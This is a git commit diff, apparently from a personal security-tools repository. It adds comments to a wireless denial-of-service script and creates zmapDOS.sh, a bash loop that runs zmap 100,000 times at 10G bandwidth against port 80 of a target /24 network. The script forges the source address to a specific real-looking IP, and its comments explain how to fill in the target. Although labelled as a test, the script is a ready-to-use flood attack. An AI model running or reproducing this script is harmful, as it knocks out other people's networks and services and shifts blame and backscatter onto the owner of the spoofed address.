4f1f9ed590f24f4534a16b8783b43a8235de1184
alvin-tosh <alvingitonga14@gmail.com>
2022-05-02 11:07:32 +0300

    bash

--- Wireless/WirelessDOS.sh
+++ Wireless/WirelessDOS.sh
@@ -1,4 +1,7 @@
 #!/bin/bash
+# Author :  Palpatine
+# Date :    2022-05-01
+# Purpose : To test the DOS attack on the wireless network
 
 for i in {1..5000}
 do
---
+++ Wireless/zmapDOS.sh
@@ -0,0 +1,10 @@
+#! /bin/bash
+# Author :  Palpatine
+# Date :    2022-05-01
+# Purpose : To test the DOS attack on the wireless network
+
+for i in {1..100000}
+do
+    zmap -i eth1 -S 85.118.181.8 -B 10G -p 80 -T 10 -P 10 <Target IP/24> # -S is a spoofed IP rather than your own | <Target IP/24> is the IP and range of the target eg 10.10.10.10/24
+    sleep 5s
+done
